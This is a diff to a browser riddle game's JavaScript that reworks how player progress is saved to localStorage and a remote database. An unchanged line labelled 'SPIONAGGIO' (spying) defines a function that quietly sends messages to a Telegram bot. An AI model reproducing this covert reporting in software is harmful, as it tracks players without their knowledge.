@@ -236,9 +236,38 @@
         setProfile(activeProfile);
     }
 
-    function saveProgressPatch(updates) {
+    function collectProgressSnapshot() {
+        const snapshot = {
+            errors: {},
+            riddlesDone: {},
+            dayComplete: {},
+            dayUnlocked: {}
+        };
+
+        for (let i = 1; i <= 10; i++) {
+            snapshot.errors[i] = errors[i] || 0;
+
+            if (localStorage.getItem(getStorageKey(`riddle${i}`)) === 'done') {
+                snapshot.riddlesDone[i] = true;
+            }
+        }
+
+        for (let d = 1; d <= 3; d++) {
+            if (localStorage.getItem(getStorageKey(`day${d}_complete`)) === 'done') {
+                snapshot.dayComplete[d] = true;
+            }
+
+            if (localStorage.getItem(getStorageKey(`day${d}_unlocked`)) === 'true') {
+                snapshot.dayUnlocked[d] = true;
+            }
+        }
+
+        return snapshot;
+    }
+
+    function saveProgressPatch() {
         if (!progressRef) return;
-        progressRef.update(updates).catch(() => {});
+        progressRef.set(collectProgressSnapshot()).catch(() => {});
     }
 
     async function loadProgress() {
@@ -247,6 +276,16 @@
 
         progressLoadPromise = progressRef.once('value').then((snapshot) => {
             const data = snapshot.val() || {};
+
+            for (let i = 1; i <= 10; i++) {
+                errors[i] = 0;
+                localStorage.removeItem(getStorageKey(`riddle${i}`));
+            }
+
+            for (let d = 1; d <= 3; d++) {
+                localStorage.removeItem(getStorageKey(`day${d}_complete`));
+                localStorage.removeItem(getStorageKey(`day${d}_unlocked`));
+            }
 
             if (data.errors) {
                 Object.entries(data.errors).forEach(([id, value]) => {
@@ -288,34 +327,33 @@
             localStorage.setItem(getStorageKey(`day${dayIndex}_complete`), 'done');
         }
 
-        saveProgressPatch({
-            [`riddlesDone/${riddleId}`]: true,
-            [`errors/${riddleId}`]: errors[riddleId] || 0,
-            [`dayComplete/${dayIndex}`]: allDone,
-            [`dayUnlocked/${dayIndex}`]: true
-        });
+        saveProgressPatch();
     }
 
     function persistWrongAttempt(riddleId) {
-        saveProgressPatch({ [`errors/${riddleId}`]: errors[riddleId] });
+        saveProgressPatch();
     }
 
     function clearRiddleState(riddleId) {
-        saveProgressPatch({
-            [`riddlesDone/${riddleId}`]: null,
-            [`errors/${riddleId}`]: 0
-        });
+        saveProgressPatch();
     }
 
     function clearDayState(dayIndex) {
-        saveProgressPatch({
-            [`dayComplete/${dayIndex}`]: null,
-            [`dayUnlocked/${dayIndex}`]: null
-        });
+        saveProgressPatch();
     }
 
     // Imposta stato iniziale della history per gestire il tasto indietro
     history.replaceState({page: 'login'}, '', location.pathname);
+
+    window.addEventListener('pagehide', () => {
+        saveProgressPatch();
+    });
+
+    document.addEventListener('visibilitychange', () => {
+        if (document.visibilityState === 'hidden') {
+            saveProgressPatch();
+        }
+    });
 
     // SPIONAGGIO
     function spiaTelegram(m) { fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(m)}`); }
@@ -402,7 +440,7 @@
             document.getElementById(`day${d}-section`).classList.remove('section-hidden');
             // salva nello storage che il giorno è stato sbloccato
             localStorage.setItem(getStorageKey(`day${d}_unlocked`), 'true');
-            saveProgressPatch({ [`dayUnlocked/${d}`]: true });
+            saveProgressPatch();
         } else {
             document.getElementById(`day${d-1}-section`).classList.remove('section-hidden');
         }
